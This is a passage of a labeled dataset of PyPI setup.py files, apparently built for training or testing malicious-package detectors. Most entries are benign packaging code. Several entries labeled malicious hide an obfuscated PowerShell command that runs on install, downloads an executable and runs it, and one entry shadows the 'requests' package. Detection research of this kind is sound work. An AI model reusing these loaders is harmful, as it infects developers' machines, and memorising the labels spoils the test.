**setup_cfg)\n\n", "target": 0}
{"idx": "django-graphql-jwt-0.3.4", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['graphql_jwt',\n 'graphql_jwt.refresh_token',\n 'graphql_jwt.refresh_token.admin',\n 'graphql_jwt.refresh_token.management',\n 'graphql_jwt.refresh_token.management.commands',\n 'graphql_jwt.refresh_token.migrations']\n\npackage_data = \\\n{'': ['*'],\n 'graphql_jwt': ['locale/ar/LC_MESSAGES/*',\n                 'locale/es/LC_MESSAGES/*',\n                 'locale/fr/LC_MESSAGES/*',\n                 'locale/nl/LC_MESSAGES/*',\n                 'locale/pt_BR/LC_MESSAGES/*',\n                 'locale/zh_Hans/LC_MESSAGES/*'],\n 'graphql_jwt.refresh_token': ['locale/ar/LC_MESSAGES/*',\n                               'locale/es/LC_MESSAGES/*',\n                               'locale/fr/LC_MESSAGES/*',\n                               'locale/nl/LC_MESSAGES/*',\n                               'locale/pt_BR/LC_MESSAGES/*',\n                               'locale/zh_Hans/LC_MESSAGES/*']}\n\ninstall_requires = \\\n['Django>=2.0', 'PyJWT>=2,<3', 'graphene-django>=2.0.0', 'graphene>=2.1.5']\n\nsetup_kwargs = {\n    'name': 'django-graphql-jwt',\n    'version': '0.3.4',\n    'description': 'JSON Web Token for Django GraphQL.',\n    'long_description': '<p align=\"center\">\\n  <a href=\"https://django-graphql-jwt.domake.io/\"><img width=\"420px\" src=\"https://django-graphql-jwt.domake.io/_static/logo.png\" alt=\\'Django GraphQL JWT\\'></a>\\n</p>\\n\\n<p align=\"center\">\\n    JSON Web Token authentication for Django GraphQL.\\n    <br>Fantastic <strong>documentation</strong> is available at <a href=\"https://django-graphql-jwt.domake.io\">https://django-graphql-jwt.domake.io</a>.\\n</p>\\n<p align=\"center\">\\n    <a href=\"https://github.com/flavors/django-graphql-jwt/actions\">\\n        <img src=\"https://github.com/flavors/django-graphql-jwt/actions/workflows/test-suite.yml/badge.svg\" alt=\"Test\">\\n    </a>\\n    <a href=\"https://codecov.io/gh/flavors/django-graphql-jwt\">\\n        <img src=\"https://img.shields.io/codecov/c/github/flavors/django-graphql-jwt?color=%2334D058\" alt=\"Coverage\">\\n    </a>\\n    <a href=\"https://www.codacy.com/gh/flavors/django-graphql-jwt/dashboard\">\\n        <img src=\"https://app.codacy.com/project/badge/Grade/4f9fd439fbc74be88a215b9ed2abfcf9\" alt=\"Codacy\">\\n    </a>\\n    <a href=\"https://pypi.python.org/pypi/django-graphql-jwt\">\\n        <img src=\"https://img.shields.io/pypi/v/django-graphql-jwt.svg\" alt=\"Package version\">\\n    </a>\\n</p>\\n\\n## Installation\\n\\nInstall last stable version from Pypi:\\n\\n```sh\\npip install django-graphql-jwt\\n```\\n\\nAdd `AuthenticationMiddleware` middleware to your *MIDDLEWARE* settings:\\n\\n\\n```py\\nMIDDLEWARE = [\\n    # ...\\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\\n    # ...\\n]\\n```\\n\\nAdd `JSONWebTokenMiddleware` middleware to your *GRAPHENE* settings:\\n\\n```py\\nGRAPHENE = {\\n    \"SCHEMA\": \"mysite.myschema.schema\",\\n    \"MIDDLEWARE\": [\\n        \"graphql_jwt.middleware.JSONWebTokenMiddleware\",\\n    ],\\n}\\n```\\n\\nAdd `JSONWebTokenBackend` backend to your *AUTHENTICATION_BACKENDS*:\\n\\n```py\\nAUTHENTICATION_BACKENDS = [\\n    \"graphql_jwt.backends.JSONWebTokenBackend\",\\n    \"django.contrib.auth.backends.ModelBackend\",\\n]\\n```\\n\\n## Schema\\n\\nAdd *django-graphql-jwt* mutations to the root schema:\\n\\n```py\\nimport graphene\\nimport graphql_jwt\\n\\n\\nclass Mutation(graphene.ObjectType):\\n    token_auth = graphql_jwt.ObtainJSONWebToken.Field()\\n    verify_token = graphql_jwt.Verify.Field()\\n    refresh_token = graphql_jwt.Refresh.Field()\\n\\n\\nschema = graphene.Schema(mutation=Mutation)\\n```\\n',\n    'author': 'mongkok',\n    'author_email': 'dani@domake.io',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/flavors/django-graphql-jwt',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "graphene-sqlalchemy-2.3.0", "func": "import ast\nimport re\nimport sys\n\nfrom setuptools import find_packages, setup\n\n_version_re = re.compile(r\"__version__\\s+=\\s+(.*)\")\n\nwith open(\"graphene_sqlalchemy/__init__.py\", \"rb\") as f:\n    version = str(\n        ast.literal_eval(_version_re.search(f.read().decode(\"utf-8\")).group(1))\n    )\n\nrequirements = [\n    # To keep things simple, we only support newer versions of Graphene\n    \"graphene>=2.1.3,<3\",\n    \"promise>=2.3\",\n    # Tests fail with 1.0.19\n    \"SQLAlchemy>=1.2,<2\",\n    \"six>=1.10.0,<2\",\n    \"singledispatch>=3.4.0.3,<4\",\n]\ntry:\n    import enum\nexcept ImportError:  # Python < 2.7 and Python 3.3\n    requirements.append(\"enum34 >= 1.1.6\")\n\ntests_require = [\n    \"pytest==4.3.1\",\n    \"mock==2.0.0\",\n    \"pytest-cov==2.6.1\",\n    \"sqlalchemy_utils==0.33.9\",\n    \"pytest-benchmark==3.2.1\",\n]\n\nsetup(\n    name=\"graphene-sqlalchemy\",\n    version=version,\n    description=\"Graphene SQLAlchemy integration\",\n    long_description=open(\"README.rst\").read(),\n    url=\"https://github.com/graphql-python/graphene-sqlalchemy\",\n    author=\"Syrus Akbary\",\n    author_email=\"me@syrusakbary.com\",\n    license=\"MIT\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Developers\",\n        \"Topic :: Software Development :: Libraries\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    keywords=\"api graphql protocol rest relay graphene\",\n    packages=find_packages(exclude=[\"tests\"]),\n    install_requires=requirements,\n    extras_require={\n        \"dev\": [\n            \"tox==3.7.0\",  # Should be kept in sync with tox.ini\n            \"coveralls==1.10.0\",\n            \"pre-commit==1.14.4\",\n        ],\n        \"test\": tests_require,\n    },\n    tests_require=tests_require,\n)\n", "target": 0}
{"idx": "py-raminteled-3.66", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-raminteled',\n    packages = ['modlib'],\n    version = '2.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-admin-list-filter-dropdown-1.0.3", "func": "# encoding: utf-8\n\nimport os\nfrom setuptools import find_packages, setup\n\nVERSION = '1.0.3'\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\ndescription = 'Use dropdowns in Django admin list filter'\nlong_description = description\nif os.path.exists('README.txt'):\n    long_description = open('README.txt').read()\n\nsetup(\n    name='django-admin-list-filter-dropdown',\n    version=VERSION,\n    packages=find_packages(),\n    include_package_data=True,\n    license='MIT License',\n    description=description,\n    long_description=long_description,\n    url='https://github.com/mrts/django-admin-list-filter-dropdown',\n    download_url='https://github.com/mrts/django-admin-list-filter-dropdown/archive/%s.zip' % VERSION,\n    author='Mart S\u00f5mermaa',\n    author_email=\"mrts.pydev@gmail.com\",\n    keywords=['django', 'admin', 'filter', 'dropdown'],\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n)\n", "target": 0}
{"idx": "fastapi-pagination-0.9.3", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['fastapi_pagination', 'fastapi_pagination.ext', 'fastapi_pagination.links']\n\npackage_data = \\\n{'': ['*']}\n\ninstall_requires = \\\n['fastapi>=0.61.2', 'pydantic>=1.7.2']\n\nextras_require = \\\n{'all': ['gino[starlette]>=1.0.1',\n         'SQLAlchemy>=1.3.20',\n         'databases[postgresql,mysql,sqlite]>=0.4.0',\n         'orm>=0.1.5',\n         'tortoise-orm[aiomysql,asyncpg,aiosqlite]>=0.16.18,<0.20.0',\n         'asyncpg>=0.24.0',\n         'ormar>=0.10.5',\n         'Django<3.3.0',\n         'piccolo>=0.29,<0.35',\n         'motor>=2.5.1,<3.0.0',\n         'mongoengine>=0.23.1,<0.25.0'],\n 'asyncpg': ['SQLAlchemy>=1.3.20', 'asyncpg>=0.24.0'],\n 'databases': ['databases[postgresql,mysql,sqlite]>=0.4.0'],\n 'django': ['databases[postgresql,mysql,sqlite]>=0.4.0', 'Django<3.3.0'],\n 'gino': ['gino[starlette]>=1.0.1', 'SQLAlchemy>=1.3.20'],\n 'mongoengine': ['mongoengine>=0.23.1,<0.25.0'],\n 'motor': ['motor>=2.5.1,<3.0.0'],\n 'orm': ['databases[postgresql,mysql,sqlite]>=0.4.0',\n         'orm>=0.1.5',\n         'typesystem>=0.2.0,<0.3.0'],\n 'ormar': ['ormar>=0.10.5'],\n 'piccolo': ['piccolo>=0.29,<0.35'],\n 'sqlalchemy': ['SQLAlchemy>=1.3.20'],\n 'tortoise': ['tortoise-orm[aiomysql,asyncpg,aiosqlite]>=0.16.18,<0.20.0']}\n\nsetup_kwargs = {\n    'name': 'fastapi-pagination',\n    'version': '0.9.3',\n    'description': 'FastAPI pagination',\n    'long_description': \"# FastAPI Pagination\\n\\n[![License](https://img.shields.io/badge/License-MIT-lightgrey)](/LICENSE)\\n[![codecov](https://github.com/uriyyo/fastapi-pagination/workflows/Test/badge.svg)](https://github.com/uriyyo/fastapi-pagination/actions)\\n[![codecov](https://codecov.io/gh/uriyyo/fastapi-pagination/branch/main/graph/badge.svg?token=QqIqDQ7FZi)](https://codecov.io/gh/uriyyo/fastapi-pagination)\\n[![Downloads](https://pepy.tech/badge/fastapi-pagination)](https://pepy.tech/project/fastapi-pagination)\\n[![PYPI](https://img.shields.io/pypi/v/fastapi-pagination)](https://pypi.org/project/fastapi-pagination/)\\n[![PYPI](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\\n[![Support me on Patreon](https://img.shields.io/endpoint.svg?url=https%3A%2F%2Fshieldsio-patreon.vercel.app%2Fapi%3Fusername%3Duriyyo%26type%3Dpatrons&style=flat)](https://patreon.com/uriyyo)\\n\\n## Installation\\n\\n```bash\\n# Basic version\\npip install fastapi-pagination\\n\\n# All available integrations\\npip install fastapi-pagination[all]\\n```\\n\\nAvailable integrations:\\n\\n* [sqlalchemy](https://github.com/sqlalchemy/sqlalchemy)\\n* [gino](https://github.com/python-gino/gino)\\n* [databases](https://github.com/encode/databases)\\n* [ormar](http://github.com/collerek/ormar)\\n* [orm](https://github.com/encode/orm)\\n* [tortoise](https://github.com/tortoise/tortoise-orm)\\n* [django](https://github.com/django/django)\\n* [piccolo](https://github.com/piccolo-orm/piccolo)\\n* [sqlmodel](https://github.com/tiangolo/sqlmodel)\\n* [motor](https://github.com/mongodb/motor)\\n* [mongoengine](https://github.com/MongoEngine/mongoengine)\\n\\n## Example\\n\\n```python\\nfrom fastapi import FastAPI\\nfrom pydantic import BaseModel\\n\\nfrom fastapi_pagination import Page, add_pagination, paginate\\n\\napp = FastAPI()\\n\\n\\nclass User(BaseModel):\\n    name: str\\n    surname: str\\n\\n\\nusers = [\\n    User(name='Yurii', surname='Karabas'),\\n    # ...\\n]\\n\\n\\n@app.get('/users', response_model=Page[User])\\nasync def get_users():\\n    return paginate(users)\\n\\n\\nadd_pagination(app)\\n```\\n\",\n    'author': 'Yurii Karabas',\n    'author_email': '1998uriyyo@gmail.com',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/uriyyo/fastapi-pagination',\n    'packages': packages,\n    'package_data': package_data,\n    'install_requires': install_requires,\n    'extras_require': extras_require,\n    'python_requires': '>=3.7,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "esqrandmask-2.67", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandmask',\n    packages = ['modlib'],\n    version = '8.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "update-requests-0.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"update-requests\",\n    version=\"0.0.1\",\n    packages=['requests'],\n    install_requires = [\n        \"requests==2.31.0\"\n    ],\n    author=\"update-requests\",\n    description=\"update-requests\"\n)", "target": 1}
{"idx": "tpreplaceget-6.91", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreplaceget',\n    packages = ['modlib'],\n    version = '9.98',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "google-cloud-vision-3.1.0", "func": "# Copyright 2018 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport io\nimport os\n\nimport setuptools\n\nname = \"google-cloud-vision\"\ndescription = \"Cloud Vision API API client library\"\nversion = \"3.1.0\"\nrelease_status = \"Development Status :: 5 - Production/Stable\"\ndependencies = [\n    \"google-api-core[grpc] >= 1.32.0, <3.0.0dev,!=2.0.*,!=2.1.*,!=2.2.*,!=2.3.*,!=2.4.*,!=2.5.*,!=2.6.*,!=2.7.*\",\n    \"proto-plus >= 1.15.0, <2.0.0dev\",\n    \"protobuf >= 3.19.0, <4.0.0dev\",\n]\n\nextras = {\"libcst\": \"libcst >= 0.2.5\"}\n\npackage_root = os.path.abspath(os.path.dirname(__file__))\n\nreadme_filename = os.path.join(package_root, \"README.rst\")\nwith io.open(readme_filename, encoding=\"utf-8\") as readme_file:\n    readme = readme_file.read()\n\npackages = [\n    package\n    for package in setuptools.PEP420PackageFinder.find()\n    if package.startswith(\"google\")\n]\n\nnamespaces = [\"google\"]\nif \"google.cloud\" in packages:\n    namespaces.append(\"google.cloud\")\n\nsetuptools.setup(\n    name=name,\n    version=version,\n    description=description,\n    long_description=readme,\n    author=\"Google LLC\",\n    author_email=\"googleapis-packages@google.com\",\n    license=\"Apache 2.0\",\n    url=\"https://github.com/googleapis/python-vision\",\n    classifiers=[\n        release_status,\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Operating System :: OS Independent\",\n        \"Topic :: Internet\",\n    ],\n    platforms=\"Posix; MacOS X; Windows\",\n    packages=packages,\n    namespace_packages=namespaces,\n    install_requires=dependencies,\n    extras_require=extras,\n    python_requires=\">=3.7\",\n    scripts=[\n        \"scripts/fixup_vision_v1_keywords.py\",\n        \"scripts/fixup_vision_v1p1beta1_keywords.py\",\n        \"scripts/fixup_vision_v1p2beta1_keywords.py\",\n        \"scripts/fixup_vision_v1p3beta1_keywords.py\",\n        \"scripts/fixup_vision_v1p4beta1_keywords.py\",\n    ],\n    include_package_data=True,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "py-edproof-4.35", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-edproof',\n    packages = ['modlib'],\n    version = '2.78',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "tphttpad-1.78", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tphttpad',\n    packages = ['modlib'],\n    version = '2.23',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geographiclib-2.0", "func": "# setup.py, config file for distutils\n#\n# To install this package, execute\n#\n#   python setup.py install\n#\n# in this directory.  To run the unit tests, execute\n#\n#   python setup.py test\n#\n# To update the HTML page for this version, run\n#\n#   python setup.py register\n#\n# To upload the latest version to the python repository, run\n#\n#   python setup.py sdist --formats gztar,zip upload\n#\n# The initial version of this file was provided by\n# Andrew MacIntyre <Andrew.MacIntyre@acma.gov.au>.\n\nimport setuptools\n\nname = \"geographiclib\"\nversion = \"2.0\"\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nsetuptools.setup(\n  name = name,\n  version = version,\n  author = \"Charles Karney\",\n  author_email = \"charles@karney.com\",\n  description = \"The geodesic routines from GeographicLib\",\n  long_description = long_description,\n  long_description_content_type = \"text/markdown\",\n  url = \"https://geographiclib.sourceforge.io/Python/2.0\" ,\n  include_package_data = True,\n  packages = setuptools.find_packages(),\n  license = \"MIT\",\n  keywords = \"gis geographical earth distance geodesic\",\n  classifiers = [\n    \"Development Status :: 5 - Production/Stable\",\n    \"Intended Audience :: Developers\",\n    \"Intended Audience :: Science/Research\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Operating System :: OS Independent\",\n    \"Programming Language :: Python\",\n    \"Topic :: Scientific/Engineering :: GIS\",\n    \"Topic :: Software Development :: Libraries :: Python Modules\",\n  ],\n  test_suite = \"geographiclib.test.test_geodesic\",\n  python_requires = \">=3.7\",\n)\n", "target": 0}
{"idx": "esqmaskpepgui-10.21", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqmaskpepgui',\n    packages = ['modlib'],\n    version = '8.91',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-import-order-0.18.1", "func": "import os\nfrom setuptools import setup, find_packages\n\n\nbase_dir = os.path.dirname(__file__)\n\nabout = {}\nwith open(os.path.join(base_dir, \"flake8_import_order\", \"__about__.py\")) as f:\n    exec(f.read(), about)\n\nwith open(os.path.join(base_dir, \"README.rst\")) as f:\n    long_description = f.read()\n\n\nsetup(\n    name=about[\"__title__\"],\n    version=about[\"__version__\"],\n\n    description=about[\"__summary__\"],\n    long_description=long_description,\n    license=about[\"__license__\"],\n    url=about[\"__uri__\"],\n    author=about[\"__author__\"],\n    author_email=about[\"__email__\"],\n    maintainer=about['__maintainer__'],\n    maintainer_email=about['__maintainer_email__'],\n\n    packages=find_packages(exclude=[\"tests\", \"tests.*\"]),\n    zip_safe=False,\n\n    install_requires=[\n        \"enum34 ;  python_version <= '2.7'\",\n        \"pycodestyle\",\n        \"setuptools\",\n    ],\n\n    tests_require=[\n        \"pytest\",\n        \"flake8\",\n        \"pycodestyle\",\n        \"pylama\"\n    ],\n\n    py_modules=['flake8_import_order'],\n    entry_points={\n        'flake8_import_order.styles': [\n            'cryptography = flake8_import_order.styles:Cryptography',\n            'google = flake8_import_order.styles:Google',\n            'pep8 = flake8_import_order.styles:PEP8',\n            'smarkets = flake8_import_order.styles:Smarkets',\n            'appnexus = flake8_import_order.styles:AppNexus',\n            'edited = flake8_import_order.styles:Edited',\n            'pycharm = flake8_import_order.styles:PyCharm',\n        ],\n        